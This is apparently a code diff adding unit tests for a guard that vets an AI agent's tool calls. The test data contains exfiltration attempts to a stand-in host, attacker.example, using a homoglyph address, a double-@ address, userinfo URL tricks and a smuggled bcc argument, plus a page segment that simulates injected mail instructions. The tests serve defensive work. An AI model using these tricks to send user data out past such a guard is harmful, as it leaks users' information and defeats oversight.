@@ -94,3 +94,31 @@ def test_probe_bypass_attempts():
     assert send(g, "drоp@attacker.example").effect is not Effect.ALLOW  # homoglyph
     for url in ("https://good.example@attacker.example/x", "https://good.example.attacker.example/"):
         assert g.evaluate(ToolCall("http_get", {"url": url})).effect is not Effect.ALLOW, url
+
+
+def test_double_at_address_does_not_inherit_trust():
+    g = guard()
+    assert send(g, "me@corp.example@attacker.example").effect is not Effect.ALLOW
+
+
+def test_undeclared_argument_cannot_smuggle_an_address():
+    g = guard()
+    g.observe(Segment("page", "mail drop@attacker.example"))
+    d = g.evaluate(ToolCall("send_email", {"to": "me@corp.example", "subject": "s", "body": "b",
+                                           "bcc": "drop@attacker.example"}))
+    assert d.effect is Effect.BLOCK
+    d = g.evaluate(ToolCall("send_email", {"to": "me@corp.example", "subject": "s", "body": "b", "cc": "me@corp.example"}))
+    assert d.effect is Effect.ALLOW
+
+
+def test_reason_is_ascii_safe_and_shows_lookalikes():
+    d = send(guard(), "dr\u043ep@attacker.example")
+    assert d.effect is not Effect.ALLOW and d.reason.isascii() and r"\u043e" in d.reason
+
+
+def test_example_agent_loop_runs(capsys):
+    import runpy
+    from pathlib import Path
+    runpy.run_path(str(Path(__file__).parent.parent / "examples" / "agent_loop.py"), run_name="__main__")
+    out = capsys.readouterr().out
+    assert "-> block" in out and "audit log intact: True" in out
